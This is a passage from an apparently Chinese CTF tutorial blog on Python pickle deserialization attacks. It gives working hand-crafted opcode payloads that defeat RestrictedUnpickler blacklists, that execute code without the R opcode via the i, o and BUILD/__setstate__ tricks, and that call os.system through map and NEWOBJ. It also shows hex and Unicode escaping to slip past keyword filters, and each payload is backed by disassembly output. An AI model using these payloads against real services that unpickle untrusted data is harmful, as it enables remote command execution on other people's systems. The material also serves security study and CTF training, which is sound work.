class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="string">b&quot;\x80\x03c_pickle\nloads\nq\x00C\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.q\x01\x85q\x02Rq\x03.&quot;</span></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;_pickle loads&#x27;</span></span><br><span class="line">   <span class="number">17</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">19</span>: C    SHORT_BINBYTES <span class="string">b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;</span></span><br><span class="line">   <span class="number">46</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">48</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">49</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">51</span>: R    REDUCE</span><br><span class="line">   <span class="number">52</span>: q    BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">54</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">3</span></span><br></pre></td></tr></table></figure><p>这里使用了字节码<code>C</code>代表byte类型，然后后面跟上数据长度的十六进制即可，我们将C\x19cos\nsystem\n(S’whoami’\ntR.<code>和上文构造好的</code>pickle.loads()&#96;函数合并即可，完整payload如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode=b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntRC\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.\x85R.&quot;</span><br></pre></td></tr></table></figure><p>测试绕过:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"> </span><br><span class="line">opcode2=opcode=<span class="string">b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntRC\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.\x85R.&quot;</span></span><br><span class="line">restricted_loads(opcode2)</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同理 pker输入：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">funcglob=GLOBAL(<span class="string">&quot;builtins&quot;</span>,<span class="string">&quot;globals&quot;</span>)</span><br><span class="line">glob=funcglob()</span><br><span class="line"><span class="built_in">dict</span>=GLOBAL(<span class="string">&quot;builtins&quot;</span>,<span class="string">&quot;dict&quot;</span>)</span><br><span class="line"><span class="built_in">getattr</span>=GLOBAL(<span class="string">&quot;builtins&quot;</span>,<span class="string">&quot;getattr&quot;</span>)</span><br><span class="line">get=<span class="built_in">getattr</span>(<span class="built_in">dict</span>,<span class="string">&quot;get&quot;</span>)</span><br><span class="line">pickle=get(glob,<span class="string">&quot;pickle&quot;</span>)</span><br><span class="line">loads=<span class="built_in">getattr</span>(pickle,<span class="string">&quot;loads&quot;</span>)</span><br><span class="line">loads(<span class="string">&quot;bytestr&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&quot;cbuiltins\nglobals\np0\n0g0\n(tRp1\n0cbuiltins\ndict\np2\n0cbuiltins\ngetattr\np3\n0g3\n(g2\nS&#x27;get&#x27;\ntRp4\n0g4\n(g1\nS&#x27;pickle&#x27;\ntRp5\n0g3\n(g5\nS&#x27;loads&#x27;\ntRp6\n0g6\n(S&#x27;bytestr&#x27;\ntR&quot;</span></span><br></pre></td></tr></table></figure><p>这里需要把生成的opcode的<code>S&#39;bytestr&#39;</code>改成byte字符串,用了<code>B</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&quot;cbuiltins\nglobals\np0\n0g0\n(tRp1\n0cbuiltins\ndict\np2\n0cbuiltins\ngetattr\np3\n0g3\n(g2\nS&#x27;get&#x27;\ntRp4\n0g4\n(g1\nS&#x27;pickle&#x27;\ntRp5\n0g3\n(g5\nS&#x27;loads&#x27;\ntRp6\n0g6\n(B\x0E\x00\x00\x00youropcodehere\ntR&quot;</span></span><br></pre></td></tr></table></figure><h4 id="绕过R指令"><a href="#绕过R指令" class="headerlink" title="绕过R指令"></a>绕过R指令</h4><p>以上方法虽然能够绕过对<code>module</code>和一些危险函数的限制，但本质上仍然是对<code>__reduce__</code>函数的延伸。倘若将字节码<code>R</code>也禁用了，那我们怎么进行RCE呢？</p><p>如果你还记得我上文所说的pickle漏洞命令执行的几种方法的话，你肯定能立即想到和函数执行有关的字节码<code>R</code>、<code>i</code>、<code>o</code>。实际上，如果没有<code>R</code>指令，我们同样能够进行函数执行。有下面这样一个例子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> stao</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, category</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no reduce!&#x27;</span></span><br><span class="line">    x=pickle.loads(data)</span><br><span class="line">    <span class="keyword">if</span>(x!= Animal(stao.name,stao.age)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not equal&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;well done! &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(stao.name,stao.age))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#stao.py</span></span><br><span class="line"> </span><br><span class="line">name=<span class="string">&quot;stao&quot;</span></span><br><span class="line">age=<span class="number">18</span></span><br></pre></td></tr></table></figure><p>这里禁用了R指令，但是我们仍有方法初始化一个Animal对象。我在上文提到过，使用R指令实例化对象的过程，实际上就是调用构造函数的过程，本质上也是函数执行，所以我们同样能够使用其他指令绕过。</p><h5 id="i指令"><a href="#i指令" class="headerlink" title="i指令"></a>i指令</h5><p>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;stao&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="o指令"><a href="#o指令" class="headerlink" title="o指令"></a>o指令</h5><p>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&#x27;stao&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>假如这里我们不知道<code>stao</code>模块的内容，我们可以通过变量覆盖的方式将原有stao中的变量覆盖掉。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">stao</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Hacker&#x27;</span></span><br><span class="line"><span class="string">S&#x27;age&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">db(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&#x27;Hacker&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="b指令"><a href="#b指令" class="headerlink" title="b指令"></a>b指令</h5><p>实我们在上文已经使用过了<code>b</code>指令，当时他的作用是用来更新栈上的一个字典进行变量覆盖。实际上官方对它的解释是<code>BUILD</code>，当PVM解析到<code>b</code>指令时执行<code>__setstate__</code>或者<code>__dict__.update()</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br></pre></td></tr></table></figure><p>那什么是<code>__setstate__</code>呢？官方文档中，如果想要存储对象的状态，就可以使用<code>__getstat__</code>和<code>__setstat__</code>方法。</p><p><strong>被反序列化时调用<code>__setstate__</code>，被序列化时调用<code>__getstate__</code>。重写时可以省略<code>__setstate__</code>，但<code>__getstate__</code>必须返回一个字典。如果<code>__getstate__</code>与<code>__setstate__</code>都被省略, 那么就默认自动保存和加载对象的属性字典<code>__dict__</code>。</strong></p><p>由于<em>pickle</em>同样可以存储对象属性的状态，所以这两个魔术方法主要是针对那些不可被序列化的状态，如一个被打开的文件句柄<code>open(file,&#39;r&#39;)</code>。</p><p>我们来看下面的例子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age=<span class="number">0</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;name: <span class="subst">&#123;self.name&#125;</span>\nage: <span class="subst">&#123;self.age&#125;</span>&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span>(<span class="title class_ inherited__">Person</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;invoke __setstate__&quot;</span>)</span><br><span class="line">        self.name=state</span><br><span class="line">        self.age=<span class="number">10</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;invoke __getstate__&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Child&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">c1=Child(<span class="string">&quot;TEST&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="comment">#name: TEST</span></span><br><span class="line"><span class="comment">#age: 0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">opcode=pickle.dumps(c1,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"><span class="comment">#invoke __getstate__</span></span><br><span class="line"><span class="comment">#b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nChild\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\nVChild\np5\nb.&#x27;</span></span><br><span class="line"> </span><br><span class="line">c2=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"><span class="comment">#invoke __setstate__</span></span><br><span class="line"><span class="comment">#name: Child</span></span><br><span class="line"><span class="comment">#age: 10</span></span><br></pre></td></tr></table></figure><p>当对象被序列化时调用<code>__getstate__</code>，被反序列化时调用<code>__setstate__</code>。重写时可以省略<code>__setstate__</code>，但<code>__getstate__</code>必须返回一个字典。如果<code>__getstate__</code>与<code>__setstate__</code>都被省略, 那么就默认自动保存和加载对象的属性字典<code>__dict__</code>。</p><p><strong>在pickle源码中，字节码<code>b</code>对应的是<code>load_build()</code>函数</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_build</span>(<span class="params">self</span>):</span><br><span class="line">    stack = self.stack</span><br><span class="line">    state = stack.pop()</span><br><span class="line">    <span class="comment">#首先获取栈上的字节码b前的一个元素，对于对象来说，该元素一般是存储有对象属性的dict</span></span><br><span class="line">    inst = stack[-<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#获取该字典中键名为&quot;__setstate__&quot;的value</span></span><br><span class="line">    setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="comment">#如果存在，则执行value(state)</span></span><br><span class="line">    <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        setstate(state)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    slotstate = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">        state, slotstate = state</span><br><span class="line">    <span class="comment">#如果&quot;__setstate__&quot;为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并</span></span><br><span class="line">    <span class="keyword">if</span> state:</span><br><span class="line">        inst_dict = inst.__dict__</span><br><span class="line">        intern = sys.intern</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                inst_dict[intern(k)] = v</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                inst_dict[k] = v</span><br><span class="line">    <span class="comment">#如果__setstate__和__getstate__都没有设置，则加载默认__dict__</span></span><br><span class="line">    <span class="keyword">if</span> slotstate:</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">            <span class="built_in">setattr</span>(inst, k, v)</span><br><span class="line">dispatch[BUILD[<span class="number">0</span>]] = load_build</span><br></pre></td></tr></table></figure><p>那么这有什么安全问题呢？如果我们将字典<code>&#123;&quot;__setstate__&quot;:os.system&#125;</code>，压入栈中，并执行<code>b</code>字节码，，由于此时并没有<code>__setstate__</code>，所以这里b字节码相当于执行了<code>__dict__.update</code>，向对象的属性字典中添加了一对新的键值对。如果我们继续向栈中压入命令command，再次执行<code>b</code>字节码时，由于已经有了<code>__setstate__</code>，所以会将栈中字节码<code>b</code>的前一个元素当作<code>state</code>，执行<code>__setstate__(state)</code>，也就是<code>os.system(command)</code>。</p><p>Payload如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&#x27;Casual&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o&#125;(S&quot;__setstate__&quot;    #向栈中压入一个空字典，然后再通过u修改为&#123;&quot;__setstate__&quot;:os.system&#125;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;whoami&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>执行结果如下，成功RCE</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> stao</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, category</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no reduce!&#x27;</span></span><br><span class="line">    x=pickle.loads(data)</span><br><span class="line">    <span class="keyword">if</span>(x!= Animal(stao.name,stao.age)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not equal&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;well done! &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(stao.name,stao.age))</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&#x27;Casual&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o&#125;(S&quot;__setstate__&quot;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;whoami&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br><span class="line">check(opcode)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">xiaoh\<span class="number">34946</span></span><br><span class="line"><span class="keyword">not</span> equal</span><br><span class="line">    <span class="number">0</span>: (    MARK</span><br><span class="line">    <span class="number">1</span>: c        GLOBAL     <span class="string">&#x27;__main__ Animal&#x27;</span></span><br><span class="line">   <span class="number">18</span>: S        STRING     <span class="string">&#x27;Casual&#x27;</span></span><br><span class="line">   <span class="number">28</span>: I        INT        <span class="number">18</span></span><br><span class="line">   <span class="number">32</span>: o        OBJ        (MARK at <span class="number">0</span>)</span><br><span class="line">   <span class="number">33</span>: &#125;    EMPTY_DICT</span><br><span class="line">   <span class="number">34</span>: (    MARK</span><br><span class="line">   <span class="number">35</span>: S        STRING     <span class="string">&#x27;__setstate__&#x27;</span></span><br><span class="line">   <span class="number">51</span>: c        GLOBAL     <span class="string">&#x27;os system&#x27;</span></span><br><span class="line">   <span class="number">62</span>: u        SETITEMS   (MARK at <span class="number">34</span>)</span><br><span class="line">   <span class="number">63</span>: b    BUILD</span><br><span class="line">   <span class="number">64</span>: S    STRING     <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">74</span>: b    BUILD</span><br><span class="line">   <span class="number">75</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="python内置函数绕过"><a href="#python内置函数绕过" class="headerlink" title="python内置函数绕过"></a>python内置函数绕过</h4><p>这一部分就是考验 python 的基础了，题目的话可以参考 美团CTF 2022 ezpickle 和 蓝帽杯2022 file_session</p><p>Python 解释器内置了很多函数和类型，任何时候都能使用。以下按字母顺序给出列表。</p><p><img src="https://bu.dusays.com/2024/05/13/6641a598e85d4.png" alt="image-20240321204655011"></p><p>不只是上文我们用的eval open等危险函数</p><p>还有一些其他函数可以进行命令执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">map</span>.__new__(<span class="built_in">map</span>, <span class="built_in">eval</span>, [<span class="string">&#x27;print(\&#x27;map\&#x27;)&#x27;</span>]):  </span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">filter</span>.__new__(<span class="built_in">filter</span>, <span class="built_in">eval</span>, [<span class="string">&#x27;print(\&#x27;filter\&#x27;)&#x27;</span>]):  </span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>如上，但是这里是有一点问题的，这两个函数构建一个新的迭代器</p><p><img src="https://bu.dusays.com/2024/05/13/6641a5988fc51.png" alt="image-20240321205013186"></p><p>这里构建的迭代器是不会立即触发的，在 python 中叫懒惰，我们需要再对迭代对象进行一步 <code>__next__</code> 才能将他触发</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = <span class="built_in">map</span>(<span class="built_in">eval</span>, [<span class="string">&#x27;print(\&#x27;1\&#x27;)&#x27;</span>])</span><br><span class="line">r.__next__()</span><br><span class="line"></span><br><span class="line">r = <span class="built_in">filter</span>(<span class="built_in">eval</span>, [<span class="string">&#x27;print(\&#x27;2\&#x27;)&#x27;</span>])</span><br><span class="line">r.__next__()</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a59836c26.png" alt="image-20240321205234761"></p><p>而 <code>__next__</code> 我们可以对他进行一个跟踪，看文档就可以</p><p><img src="https://bu.dusays.com/2024/05/13/6641a5983df85.png" alt="image-20240321205305266"></p><p>Python&#x2F;C API 中 Python 对象类型结构体的 <a href="https://docs.python.org/zh-cn/3/c-api/typeobj.html#c.PyTypeObject.tp_iternext"><code>tp_iternext</code></a> 槽位</p><p><img src="https://bu.dusays.com/2024/05/13/6641a59864754.png" alt="image-20240321205341056"></p><p>可以看到最下面，这里实际上也就是对应着 <code>PyIter_Next</code></p><p>PyIter_Next:</p><p><img src="https://bu.dusays.com/2024/05/13/6641a5985c738.png" alt="image-20240321205452655"></p><p>我们现在想要构造一个能够被调用的 pickle 反序列化的 payload 的时候，触发的方式就不能是再在后面拼接 <code>__next__()</code> 了，我们需要找一个能够触发 <code>PyIter_Next</code> 的方法：</p><blockquote><p>类的<code>__new__()</code>构造方法:</p><p>着重注意这个操作符:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NEWOBJ = b&#x27;\x81&#x27;#(这个很有用)  #从栈中弹出两次变量,第一次弹出的变量记为var1,第二次弹出的变量记为var2,然后就会通过cls.__new__(var2, *var1)生成实例化对象,然后将生成的对象压栈</span><br></pre></td></tr></table></figure><p>他是可以触发类的<code>__new__()</code>函数的,所以在某些时候可以寻找可用的<code>__new__()</code>方法进行绕过.在下一个方法中,我们正是用了这一点才代替<code>__next__()</code>方法进行迭代.</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bytes</span>.__new__(<span class="built_in">bytes</span>, <span class="built_in">map</span>.__new__(<span class="built_in">map</span>, <span class="built_in">eval</span>, [<span class="string">&#x27;print(1)&#x27;</span>]))  <span class="comment"># bytes_new-&gt;PyBytes_FromObject-&gt;_PyBytes_FromIterator-&gt;PyIter_Next</span></span><br><span class="line"><span class="built_in">tuple</span>.__new__(<span class="built_in">tuple</span>, <span class="built_in">map</span>.__new__(<span class="built_in">map</span>, <span class="built_in">exec</span>, [<span class="string">&quot;print(&#x27;1&#x27;)&quot;</span>]))  <span class="comment"># tuple_new_impl-&gt;PySequence_Tuple-&gt;PyIter_Next</span></span><br></pre></td></tr></table></figure><p>也就是:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">map</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">0(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tp1</span></span><br><span class="line"><span class="string">0(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">g1</span></span><br><span class="line"><span class="string">tp2</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">g2</span></span><br><span class="line"><span class="string">\x81p3</span></span><br><span class="line"><span class="string">0c__builtin__</span></span><br><span class="line"><span class="string">tuple</span></span><br><span class="line"><span class="string">p4</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">t\x81.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">map</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">0(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tp1</span></span><br><span class="line"><span class="string">0(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">g1</span></span><br><span class="line"><span class="string">tp2</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">g2</span></span><br><span class="line"><span class="string">\x81p3</span></span><br><span class="line"><span class="string">0c__builtin__</span></span><br><span class="line"><span class="string">bytes</span></span><br><span class="line"><span class="string">p4</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">t\x81.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(opcode)</span><br></pre></td></tr></table></figure><p>用到的核心其实就是:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">NEWOBJ  = <span class="string">b&#x27;\x81&#x27;</span>  <span class="comment"># build object by applying cls.__new__ to argtuple</span></span><br></pre></td></tr></table></figure><h3 id="绕过敏感字符"><a href="#绕过敏感字符" class="headerlink" title="绕过敏感字符"></a>绕过敏感字符</h3><h4 id="S"><a href="#S" class="headerlink" title="S"></a>S</h4><p><code>S</code> 操作码本身是 String ，是支持十六进制的识别的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S&#x27;flag&#x27; =&gt; S&#x27;\x66\x6c\x61\x67&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c__main__</span><br><span class="line">secret</span><br><span class="line">(S<span class="string">&#x27;\x6bey&#x27;</span>  <span class="comment">#key</span></span><br><span class="line">S<span class="string">&#x27;asd&#x27;</span></span><br><span class="line">db.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;capp</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(S&#x27;\x73ecret&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db0(capp</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="V"><a href="#V" class="headerlink" title="V"></a>V</h4><p><code>V</code>指令的用法，类似于指令<code>S</code></p><p><img src="https://bu.dusays.com/2024/05/13/6641a598118c9.png" alt="image-20240321210631706"></p><p>在指令集中存在一个 <code>V</code> 用于操作 Unicode 字符，对原本的 S 进行替换后即可在单引号内使用 Unicode 编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S&#x27;flag&#x27; =&gt; 